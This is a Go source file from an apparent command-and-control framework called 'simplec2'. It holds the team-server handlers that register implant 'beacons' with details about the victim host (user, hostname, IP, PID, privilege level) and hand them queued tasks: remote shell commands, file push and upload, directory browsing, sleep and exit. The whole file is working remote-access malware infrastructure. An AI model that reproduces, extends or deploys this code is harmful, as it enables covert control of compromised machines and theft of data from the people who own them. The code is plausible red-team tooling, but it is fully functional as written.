package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"

	"github.com/google/uuid"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/peer"
	"google.golang.org/grpc/status"
	"simplec2/pkg/bridge"
	"simplec2/teamserver/data"
)

func (s *server) StageBeacon(ctx context.Context, in *bridge.StageBeaconRequest) (*bridge.StageBeaconResponse, error) {
	log.Printf("Received StageBeacon from listener: %s", in.ListenerName)

	// Extract remote address from gRPC context
	var remoteAddr string
	p, ok := peer.FromContext(ctx)
	if ok {
		remoteAddr = p.Addr.String()
	}

	beacon := data.Beacon{
		BeaconID:      uuid.New().String(),
		Listener:      in.ListenerName,
		RemoteAddr:    remoteAddr,
		Status:        "active",
		FirstSeen:     time.Now(),
		LastSeen:      time.Now(),
		Sleep:         5, // Default sleep
		OS:            in.Metadata.Os,
		Arch:          in.Metadata.Arch,
		Username:      in.Metadata.Username,
		Hostname:      in.Metadata.Hostname,
		InternalIP:    in.Metadata.InternalIp,
		ProcessName:   in.Metadata.ProcessName,
		PID:           in.Metadata.Pid,
		IsHighIntegrity: in.Metadata.IsHighIntegrity,
	}

	if err := s.Store.CreateBeacon(&beacon); err != nil {
		log.Printf("Error saving beacon to database: %v", err)
		return nil, err
	}

	log.Printf("New beacon with ID %s saved to database", beacon.BeaconID)

	return &bridge.StageBeaconResponse{
		AssignedBeaconId: beacon.BeaconID,
	}, nil
}

func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequest) (*bridge.CheckInBeaconResponse, error) {
	log.Printf("Received CheckInBeacon from beacon: %s", in.BeaconId)

	beacon, err := s.Store.GetBeacon(in.BeaconId)
	if err != nil {
		log.Printf("Beacon %s not found during check-in: %v. Assuming exited.", in.BeaconId, err)
		return nil, status.Errorf(codes.NotFound, "beacon not found")
	}

	// Update beacon's last seen time
	beacon.LastSeen = time.Now()

	// If beacon is in 'exiting' state, send it an exit task.
	if beacon.Status == "exiting" {
		log.Printf("Beacon %s is in 'exiting' state. Sending final exit task.", in.BeaconId)
		var grpcTasks []*bridge.Task
		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    uuid.New().String(),
			CommandId: 4, // CommandID for exit
			Arguments: nil,
		})
		s.Store.UpdateBeacon(beacon) // Save updated LastSeen
		return &bridge.CheckInBeaconResponse{
			Tasks: grpcTasks,
		}, nil
	}

	s.Store.UpdateBeacon(beacon)

	// Find queued tasks for this beacon
	var grpcTasks []*bridge.Task

	allTasks, err := s.Store.GetTasksByBeaconID(in.BeaconId)
	if err != nil {
		log.Printf("Error getting tasks for beacon %s: %v", in.BeaconId, err)
		return nil, err
	}

	for _, dbTask := range allTasks {
		if dbTask.Status != "queued" {
			continue
		}

		var cmdID uint32
		var taskArgs []byte

		switch dbTask.Command {
		case "shell":
			cmdID = 1
			taskArgs = []byte(dbTask.Arguments)
		case "download":
			cmdID = 2
			// 解析下载参数
			if dbTask.Arguments == "" {
				log.Printf("Download task %s has no arguments", dbTask.TaskID)
				taskArgs = nil
			} else {
				// 参数格式: {"source": "uploads/xxx.pdf", "destination": "/path/on/beacon"}
				var downloadArgs struct {
					Source      string `json:"source"`
					Destination string `json:"destination"`
				}
				if err := json.Unmarshal([]byte(dbTask.Arguments), &downloadArgs); err != nil {
					log.Printf("Failed to parse download arguments for task %s: %v", dbTask.TaskID, err)
					taskArgs = nil
				} else {
					// 读取源文件
					sourcePath := downloadArgs.Source
					if !filepath.IsAbs(sourcePath) {
						// 相对路径相对于当前工作目录（TeamServer启动目录）
						sourcePath = filepath.Join(".", sourcePath)
					}

					log.Printf("Reading file for download: %s", sourcePath)
					fileData, err := os.ReadFile(sourcePath)
					if err != nil {
						log.Printf("Failed to read file %s: %v", sourcePath, err)
						// 返回错误信息给Beacon
						errorMsg := fmt.Sprintf("Failed to read file: %v", err)
						taskArgs = []byte(errorMsg)
					} else {
						// 构建Beacon期望的参数格式
						beaconArgs := struct {
							DestPath string `json:"dest_path"`
							FileData string `json:"file_data"`
						}{
							DestPath: downloadArgs.Destination,
							FileData: base64.StdEncoding.EncodeToString(fileData),
						}
						taskArgs, _ = json.Marshal(beaconArgs)
						log.Printf("Successfully prepared file for download: %s (%d bytes)", downloadArgs.Destination, len(fileData))
					}
				}
			}
		case "upload":
			cmdID = 3
			taskArgs = []byte(dbTask.Arguments)
		case "exit":
			cmdID = 4
			taskArgs = nil
		case "sleep":
			cmdID = 5
			// 解析sleep参数，验证范围 (1-3600秒)
			log.Printf("Processing sleep task %s: Arguments=%q (len=%d)", dbTask.TaskID, dbTask.Arguments, len(dbTask.Arguments))
			if dbTask.Arguments != "" {
				taskArgs = []byte(dbTask.Arguments)
			} else {
				// 默认sleep值
				taskArgs = []byte("5")
			}
			log.Printf("Sleep task %s: taskArgs=%q (len=%d)", dbTask.TaskID, taskArgs, len(taskArgs))
		case "browse":
			cmdID = 6
			taskArgs = []byte(dbTask.Arguments)
		default:
			log.Printf("Unknown command type for task %s: %s", dbTask.TaskID, dbTask.Command)
			continue
		}

		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    dbTask.TaskID,
			CommandId: cmdID,
			Arguments: taskArgs,
		})

		// Update task status to dispatched
		dbTask.Status = "dispatched"
		s.Store.UpdateTask(&dbTask)
	}

	return &bridge.CheckInBeaconResponse{
		Tasks: grpcTasks,
		// NewSleep 字段不再使用，sleep间隔现在通过任务系统控制
	}, nil
}
